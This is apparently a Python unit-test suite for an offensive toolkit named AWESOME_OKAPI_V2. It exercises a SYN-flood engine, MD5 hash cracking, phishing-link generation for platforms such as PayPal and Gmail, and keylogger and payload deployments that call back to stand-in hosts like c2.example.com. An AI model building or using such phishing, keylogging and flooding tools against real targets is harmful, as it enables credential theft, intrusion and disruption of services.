#!/usr/bin/env python3
"""
Test suite for AWESOME_OKAPI_V2
"""

import unittest
import os
import sys
import json
import tempfile
import shutil
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from awesome_okapi_v2 import (
    ConfigManager,
    DatabaseManager,
    SSHManager,
    TrafficGeneratorEngine,
    DOSEngine,
    CrackingEngine,
    CommandHandler,
    NetworkTools,
    DomainHostingEngine,
    DeploymentEngine,
    KeyloggerEngine,
    SocialEngineeringTools
)

class TestConfigManager(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.old_cwd = os.getcwd()
        os.chdir(self.temp_dir)
        
    def tearDown(self):
        os.chdir(self.old_cwd)
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_config_loading(self):
        """Test configuration loading"""
        config = ConfigManager()
        self.assertIsNotNone(config.config)
        self.assertEqual(config.get('version'), '2.0.0')
    
    def test_config_save_load(self):
        """Test saving and loading configuration"""
        config = ConfigManager()
        config.set('test.key', 'test_value')
        config.save()
        
        new_config = ConfigManager()
        self.assertEqual(new_config.get('test.key'), 'test_value')
    
    def test_default_values(self):
        """Test default configuration values"""
        config = ConfigManager()
        self.assertEqual(config.get('scan_timeout'), 30)
        self.assertEqual(config.get('web.port'), 5000)
        self.assertTrue(config.get('traffic_generation.enabled'))


class TestDatabaseManager(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test.db')
        self.db = DatabaseManager(self.db_path)
        
    def tearDown(self):
        self.db.close()
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_table_creation(self):
        """Test database table creation"""
        tables = self.db.conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()
        table_names = [t[0] for t in tables]
        self.assertIn('users', table_names)
        self.assertIn('command_history', table_names)
        self.assertIn('threats', table_names)
    
    def test_log_command(self):
        """Test logging commands"""
        self.db.log_command('test command', 'local', 'discord', 'user1', True, 'output')
        count = self.db.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
        self.assertEqual(count, 1)
    
    def test_manage_ip(self):
        """Test IP management"""
        self.db.add_managed_ip('192.168.1.1', 'test.local', 'admin')
        ips = self.db.get_managed_ips()
        self.assertEqual(len(ips), 1)
        self.assertEqual(ips[0]['ip_address'], '192.168.1.1')
    
    def test_block_ip(self):
        """Test IP blocking"""
        self.db.add_managed_ip('192.168.1.100')
        self.db.block_ip('192.168.1.100', 'Test block')
        ips = self.db.get_managed_ips()
        self.assertTrue(ips[0]['is_blocked'])


class TestNetworkTools(unittest.TestCase):
    def test_ping(self):
        """Test ping functionality"""
        result = NetworkTools.ping('127.0.0.1', count=1)
        self.assertTrue(result.success)
    
    def test_get_local_ip(self):
        """Test getting local IP"""
        ip = NetworkTools.get_local_ip()
        self.assertIsNotNone(ip)
        self.assertNotEqual(ip, '')
    
    def test_ip_to_domain(self):
        """Test IP to domain resolution"""
        domain = NetworkTools.ip_to_domain('8.8.8.8')
        # May or may not resolve depending on DNS
        if domain:
            self.assertIsInstance(domain, str)
    
    def test_domain_to_ip(self):
        """Test domain to IP resolution"""
        ip = NetworkTools.domain_to_ip('google.com')
        self.assertIsNotNone(ip)
        self.assertNotEqual(ip, '')


class TestSSHManager(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test.db')
        self.db = DatabaseManager(self.db_path)
        
    def tearDown(self):
        self.db.close()
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_ssh_connection(self):
        """Test SSH connection management"""
        ssh = SSHManager(self.db)
        if ssh.is_available():
            conn = ssh.add_connection('test', 'localhost', 'testuser', 'password')
            self.assertIsNotNone(conn.id)
            connections = ssh.get_connections()
            self.assertEqual(len(connections), 1)


class TestDomainHosting(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test.db')
        self.db = DatabaseManager(self.db_path)
        self.config = ConfigManager()
        
    def tearDown(self):
        self.db.close()
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_domain_hosting(self):
        """Test domain hosting engine"""
        engine = DomainHostingEngine(self.db, self.config)
        host = engine.host_domain('127.0.0.1', 'test.local', 8080)
        self.assertIsNotNone(host)
        self.assertEqual(host.domain, 'test.local')
        
        # Test listing
        domains = engine.list_hosted_domains()
        self.assertEqual(len(domains), 1)
    
    def test_ip_to_domain_translation(self):
        """Test IP to domain translation"""
        engine = DomainHostingEngine(self.db, self.config)
        engine.host_domain('10.0.0.1', 'mydomain.local')
        
        domain = engine.translate_ip_to_domain('10.0.0.1')
        self.assertEqual(domain, 'mydomain.local')


class TestCrackingEngine(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test.db')
        self.db = DatabaseManager(self.db_path)
        self.config = ConfigManager()
        
        # Create a test wordlist
        self.wordlist_path = os.path.join(self.temp_dir, 'wordlist.txt')
        with open(self.wordlist_path, 'w') as f:
            f.write('password\n123456\nsecret\n')
        
    def tearDown(self):
        self.db.close()
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_cracking_engine_initialization(self):
        """Test cracking engine initialization"""
        engine = CrackingEngine(self.db, self.config)
        self.assertIsNotNone(engine)
    
    def test_hash_cracking(self):
        """Test hash cracking"""
        engine = CrackingEngine(self.db, self.config)
        
        # Test MD5 cracking
        md5_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # 'password'
        job_id = engine.crack_hash('md5', md5_hash, self.wordlist_path)
        self.assertIsNotNone(job_id)
        
        # Check job status
        job = engine.get_job_status(job_id)
        self.assertIsNotNone(job)
        self.assertEqual(job['hash_type'], 'md5')
    
    def test_hash_type_mapping(self):
        """Test hash type mapping"""
        engine = CrackingEngine(self.db, self.config)
        self.assertEqual(engine._get_hash_type_num('md5'), 0)
        self.assertEqual(engine._get_hash_type_num('sha256'), 1400)
        self.assertEqual(engine._get_hash_type_num('ntlm'), 1000)


class TestDeploymentEngine(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test.db')
        self.db = DatabaseManager(self.db_path)
        self.config = ConfigManager()
        
    def tearDown(self):
        self.db.close()
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_pdf_deployment(self):
        """Test PDF deployment creation"""
        engine = DeploymentEngine(self.db, self.config)
        deployment = engine.create_pdf_payload(
            'Test PDF',
            'test@example.com',
            'http://c2.example.com/keylog'
        )
        self.assertIsNotNone(deployment)
        self.assertEqual(deployment.type, 'pdf')
        self.assertEqual(deployment.target, 'test@example.com')
    
    def test_link_deployment(self):
        """Test link deployment creation"""
        engine = DeploymentEngine(self.db, self.config)
        deployment = engine.create_link_payload(
            'Test Link',
            'user@example.com',
            'http://c2.example.com/download'
        )
        self.assertIsNotNone(deployment)
        self.assertEqual(deployment.type, 'link')
    
    def test_executable_deployment(self):
        """Test executable deployment creation"""
        engine = DeploymentEngine(self.db, self.config)
        deployment = engine.create_executable_payload(
            'Test EXE',
            'target@example.com',
            'http://c2.example.com'
        )
        self.assertIsNotNone(deployment)
        self.assertEqual(deployment.type, 'executable')


class TestSocialEngineeringTools(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test.db')
        self.db = DatabaseManager(self.db_path)
        
    def tearDown(self):
        self.db.close()
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_phishing_link_generation(self):
        """Test phishing link generation"""
        tools = SocialEngineeringTools(self.db)
        result = tools.generate_phishing_link('facebook')
        self.assertTrue(result['success'])
        self.assertIsNotNone(result['link_id'])
    
    def test_multiple_platforms(self):
        """Test multiple platform phishing templates"""
        tools = SocialEngineeringTools(self.db)
        platforms = ['facebook', 'instagram', 'twitter', 'gmail', 'linkedin', 'google', 'apple', 'paypal']
        
        for platform in platforms:
            result = tools.generate_phishing_link(platform)
            self.assertTrue(result['success'], f"Failed for {platform}")
    
    def test_phishing_server_start(self):
        """Test phishing server start (mock)"""
        tools = SocialEngineeringTools(self.db)
        result = tools.generate_phishing_link('test')
        # Skip actual server start in tests
        self.assertTrue(result['success'])


class TestDOSEngine(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test.db')
        self.db = DatabaseManager(self.db_path)
        self.config = ConfigManager()
        
    def tearDown(self):
        self.db.close()
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_dos_engine_initialization(self):
        """Test DOS engine initialization"""
        engine = DOSEngine(self.db, self.config)
        self.assertIsNotNone(engine)
        self.assertEqual(len(engine.get_active()), 0)
    
    def test_dos_attack_creation(self):
        """Test DOS attack creation"""
        engine = DOSEngine(self.db, self.config)
        # Test with localhost (should fail or be limited)
        result = engine.syn_flood('127.0.0.1', 80, 1, 5)
        # Should work without errors
        self.assertIn('success', result)


class TestCommandHandler(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test.db')
        self.db = DatabaseManager(self.db_path)
        self.handler = CommandHandler(self.db)
        
    def tearDown(self):
        self.db.close()
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_help_command(self):
        """Test help command"""
        result = self.handler.execute('help')
        self.assertTrue(result['success'])
        self.assertIn('AWESOME_OKAPI', result['output'])
    
    def test_ping_command(self):
        """Test ping command"""
        result = self.handler.execute('ping 127.0.0.1')
        self.assertTrue(result['success'])
    
    def test_status_command(self):
        """Test status command"""
        result = self.handler.execute('status')
        self.assertTrue(result['success'])
        self.assertIn('System Status', result['output'])
    
    def test_history_command(self):
        """Test history command"""
        self.handler.execute('ping 127.0.0.1')
        result = self.handler.execute('history')
        self.assertTrue(result['success'])
        self.assertIn('ping', result['output'])
    
    def test_ip_management(self):
        """Test IP management commands"""
        result = self.handler.execute('add_ip 192.168.1.100 Test IP')
        self.assertTrue(result['success'])
        
        result = self.handler.execute('list_ips')
        self.assertTrue(result['success'])
        self.assertIn('192.168.1.100', result['output'])
    
    def test_domain_hosting_commands(self):
        """Test domain hosting commands"""
        result = self.handler.execute('host_domain 127.0.0.1 testhost.local')
        self.assertTrue(result['success'])
        
        result = self.handler.execute('list_domains')
        self.assertTrue(result['success'])
        self.assertIn('testhost.local', result['output'])


class TestTrafficGenerator(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.temp_dir, 'test.db')
        self.db = DatabaseManager(self.db_path)
        
    def tearDown(self):
        self.db.close()
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def test_traffic_generator_initialization(self):
        """Test traffic generator initialization"""
        engine = TrafficGeneratorEngine(self.db)
        self.assertIsNotNone(engine)
        types = engine.get_available_types()
        self.assertIn('icmp', types)
        self.assertIn('tcp_syn', types)


if __name__ == '__main__':
    unittest.main()